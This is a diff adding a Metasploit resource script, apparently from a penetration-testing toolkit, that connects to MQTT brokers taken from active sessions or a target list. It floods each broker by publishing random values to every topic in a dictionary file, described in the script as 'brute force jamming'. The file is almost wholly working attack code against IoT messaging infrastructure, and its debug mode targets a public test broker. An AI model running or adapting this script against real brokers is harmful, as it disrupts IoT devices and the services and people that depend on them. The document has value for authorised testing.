@@ -1,0 +1,73 @@
+<ruby>
+require 'paho-mqtt'
+
+client = PahoMqtt::Client.new
+$broker = ""
+
+def set_broker(address)
+	$broker = address
+end
+
+begin
+	framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+	print_error("Database connection isn't established")
+	return
+end
+
+client.on_connack = proc {
+  print_good("Connected to the broker #{$broker} for the brute force jamming!")
+  if File.exist?(framework.datastore["dictionary_file_path"])
+    print_good("Dictionary file found!")
+    if !File.zero?(framework.datastore["dictionary_file_path"])
+      print_good("Brute force attack is starting!")
+      File.open(framework.datastore["dictionary_file_path"]).each do |line|
+        random_number = rand(0...100)
+        line = line[0...-1]
+        client.publish(line, random_number, false, 0)
+      end
+    else
+      print_error("Dictionary file empty!")
+    end      
+  else
+    print_error("Dictionary file not found!")
+  end
+}
+
+begin
+	if framework.datastore["full_automatic"]
+		mosquitto_port = framework.datastore["mosquitto_port"]
+		print_line("---- RUNNING FULL AUTOMATIC ----")
+		framework.sessions.each do |session|
+			if framework.datastore["mosquitto_debug"] == true
+				set_broker("test.mosquitto.org")
+				client.connect('test.mosquitto.org', mosquitto_port)
+			else
+				set_broker(session[1].session_host)
+				client.connect(session[1].session_host, mosquitto_port)
+			end
+		end
+	else
+		print_line("---- RUNNING ON TARGETS ----")
+		mosquitto_port = framework.datastore["mosquitto_port"]
+		for i in framework.datastore["targets"]
+				if framework.datastore["mosquitto_debug"] == true
+					set_broker("test.mosquitto.org")
+					client.connect('test.mosquitto.org', mosquitto_port)
+				else
+                    set_broker(i)
+                    begin
+                        client.connect(i, mosquitto_port)
+                    rescue PahoMqtt::WritingException
+                        print_error("An error occured while publishing the message.")
+                    end
+                    print_good("Brute force attack completed!")
+				end
+		end
+	end
+rescue Msf::Exception
+	print_error("Exception in mosquitto_brute_force_jammer_PT.rc")
+	return
+end
+
+</ruby>
